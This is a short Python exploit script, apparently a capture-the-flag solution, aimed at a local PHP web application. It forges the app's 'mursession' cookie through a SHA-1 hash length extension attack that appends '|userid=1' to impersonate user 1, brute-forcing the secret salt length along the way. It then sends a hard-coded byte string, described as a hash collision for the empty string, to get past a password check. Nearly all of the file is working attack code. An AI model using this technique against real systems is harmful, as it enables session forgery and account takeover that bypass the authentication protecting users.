import base64
import urllib.parse

import requests
from hle import new as hle_new


def decode_session_cookie(cookie_value):
    pld, hsh = (urllib.parse.unquote(x) for x in cookie_value.split("."))
    pld = base64.b64decode(pld).decode()
    hsh = base64.b64decode(hsh).decode()

    return pld, hsh

def encode_session_cookie(pld, hsh):
    pld = base64.b64encode(pld).decode()
    hsh = base64.b64encode(hsh).decode()

    return urllib.parse.quote(pld) + "." + urllib.parse.quote(hsh)

s = requests.Session()
r = s.post('http://localhost:8008/register.php', data={'username': 'someuser', 'password': 'someuser', 'passport': '1234'})
r = s.post('http://localhost:8008/login.php', data={'username': 'someuser', 'password': 'someuser'})

if r.status_code != 200:
    print(r.text)
    exit(1)

sess_value = s.cookies.get('mursession')
print(sess_value)

pld, hsh = decode_session_cookie(sess_value)

new_cookie_value = sess_value
for salt_size in range(1, 30):
    sha_hl = hle_new('sha1')
    extended = sha_hl.extend(b'|userid=1', pld.encode(), salt_size, hsh)
    new_value = encode_session_cookie(extended, sha_hl.hexdigest().encode())
    r = requests.get('http://localhost:8008/index.php', cookies={'mursession': new_value}, allow_redirects=False)
    if r.status_code == 200:
        print(r.text)
        new_cookie_value = new_value
        break

r = requests.post('http://localhost:8008/passport.php', cookies={'mursession': new_cookie_value},
                  # Collision for ''
                  data={'password': b'^\xd0\xb8\x93\xf1\x0c\x08\x8c\xcf\x0e\x00{\xf6\xed\xbfa'})

print(r.text)